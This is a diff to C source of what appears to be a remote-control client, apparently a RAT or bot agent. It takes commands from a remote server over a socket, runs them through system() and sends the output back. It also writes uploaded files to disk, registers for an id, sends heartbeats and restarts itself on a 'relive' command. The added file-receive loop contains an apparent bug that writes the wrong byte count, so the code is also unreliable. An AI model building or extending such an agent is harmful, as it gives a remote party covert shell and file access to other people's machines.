@@ -54,19 +54,45 @@ int report(int ans,int sock, int loglen)
 
 int xsystem(char* shellbuf, int sock)
 {
-	int pipefd[2];
+	int pipefd[2], loop, loop2, size= 0, si= 0;
 	pipe(pipefd);
 	int fd = dup2(pipefd[1], STDOUT_FILENO);
-	DEBUGI(fd);
-	char buf[4096] = {0};
+	fd = dup2(pipefd[1], STDERR_FILENO);
+	
 	system(shellbuf);
-	int size = read(pipefd[0], buf, 4096);
+
+/*	char buf[4096];
+	int m, n;
+	while((m = read(pipefd[0], buf, 4096)) > 0)
+		if( (n = write(sock, buf, m)) < 0)
+			break;
+*/
+	char* buf[20] = {0};
+	for(loop = 0; loop<20; loop++)
+	{
+		buf[loop] = (char*)malloc(4096);
+		si = read(pipefd[0], buf[loop], 4096);
+		size+=si;
+		if(si!=4096)
+		{
+			loop++;
+			break;
+		}
+	}
 
 	int ans = report(1,sock,size);
 	if(ans == false)
-		return false;
+		return false;	
 
-	size = sendpt(sock, buf, size);
+	for(loop2 = 0; loop2<loop; loop2++)
+	{
+		if(loop2 == loop-1)
+			sendpt(sock, buf[loop2], si);
+		else
+			sendpt(sock, buf[loop2], 4096);
+		free(buf[loop2]);
+	}
+	
 }
 
 int waiting(int sock)
@@ -75,9 +101,9 @@ int waiting(int sock)
 	while(1)
 	{
 		int n = recvpt(sock,&k,sizeof(U_MSG));
-		DEBUGI(k.shell_m.commandlen);
 		if(n!=sizeof(U_MSG))
 		{
+			DEBUGW;DEBUGI(n);
 			perror("read err");
 			return false;
 		}
@@ -90,13 +116,21 @@ int waiting(int sock)
 				n = recvpt(sock,shellbuf,k.shell_m.commandlen);
 				if(n!=k.shell_m.commandlen)
 				{
+					DEBUGW;DEBUGI(n);
 					perror("read err");
 					free(shellbuf);
 					return false;
 				}
-				printf("%s\n", shellbuf);
-				xsystem(shellbuf, sock);
-				free(shellbuf);
+				if(strcmp(shellbuf, "relive") == 0)
+				{
+					close(sock);
+					execl("./main", "main", NULL);
+				}
+				else
+				{
+					xsystem(shellbuf, sock);
+					free(shellbuf);					
+				}
 				break;
 			}
 			case T_TFILE:
@@ -106,6 +140,7 @@ int waiting(int sock)
 				n = recvpt(sock,tfilebuf,k.tfile_m.path);
 				if(n!=k.tfile_m.path)
 				{
+					DEBUGW;DEBUGI(n);
 					perror("read err");
 					free(tfilebuf);
 					return false;
@@ -125,6 +160,15 @@ int waiting(int sock)
 					return false;
 
 				char buffile[4096] = {0};
+				int m=0, n, o;
+				while((o = read(sock, buffile, 4096)) > 0)
+				{
+					if( (n = write(fd, buffile, m)) < 0)
+						break;
+					if( (m=m+o) == k.tfile_m.size )
+						break;
+				}
+/*				
 				int ret;
 				if(k.tfile_m.size > 4096)
 				{
@@ -132,24 +176,31 @@ int waiting(int sock)
 					if(k.tfile_m.size%4096 != 0)
 						times += 1;
 					int i = 0;
+					DEBUGW;
 					for (; i < times; ++i)
 					{
 						if( (i == times-1) && ( k.tfile_m.size%4096 != 0) )
 							ret = recvpt(sock, buffile, k.tfile_m.size%4096);
 						else
 							ret = recvpt(sock, buffile, 4096);
-						if(ret <= 0)
+						if(ret < 0)
+						{
+							DEBUGW;
 							break;
+						}
 						write(fd, buffile, ret);
 					}
+					DEBUGW;
 				}
 				else
 				{
+					DEBUGW;
 					ret = recvpt(sock, buffile, k.tfile_m.size);
 					if(ret <= 0)
 						break;
 					write(fd, buffile, ret);
 				}
+				DEBUGW;*/
 				close(fd);
 			}
 			default:
@@ -169,6 +220,8 @@ void* ping_pthread(void * argument)
 
 int dnsbyping(char* ip)
 {
+	if( atoi(ip) != 0 )
+		return true;
 	char *filename = "tmp.txt";
 	char newip[30] = {0};
 	char ping[40] = {0};
@@ -268,6 +321,10 @@ int rgist(int sock)
 	if(n!=sizeof(U_MSG))
 		return false;
 	extid = k.regist_m.id;
+	char idchr[6] = {0};
+	sprintf(idchr, "%d", extid);
+	DEBUGS(idchr);
+	wrcfg("id", idchr);
 	return k.regist_m.id;
 }
 
@@ -280,4 +337,5 @@ int beatheart(int sock)
 	int n = sendpt(sock,&k,sizeof(U_MSG));
 	if(n!=sizeof(U_MSG))
 		return false;
+	return true;
 }
